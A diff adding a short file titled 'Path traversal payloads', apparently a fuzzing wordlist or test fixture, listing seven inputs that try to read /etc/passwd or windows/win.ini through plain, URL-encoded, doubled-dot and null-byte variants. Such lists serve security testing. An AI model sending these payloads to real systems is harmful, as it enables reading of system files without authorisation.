@@ -1,0 +1,8 @@
+# Path traversal payloads
+../../../../etc/passwd
+..%2f..%2f..%2f..%2fetc%2fpasswd
+....//....//....//etc/passwd
+/etc/passwd
+..\..\..\..\windows\win.ini
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+/etc/passwd%00.png
